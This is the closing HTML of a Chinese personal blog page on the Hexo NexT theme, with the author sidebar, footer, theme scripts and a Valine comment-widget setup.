总结</span></a></li></ol></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="rev1ve"
      src="/images/1.jpg">
  <p class="site-author-name" itemprop="name">rev1ve</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">73</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">35</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2024-03 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rev1ve</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>


  <script defer src="/lib/three/three.min.js"></script>


  




  
<script src="/js/local-search.js"></script>













  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
      placeholder: "快来评论叭",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
    });
  }, window.Valine);
});
</script>

</body>
</html>
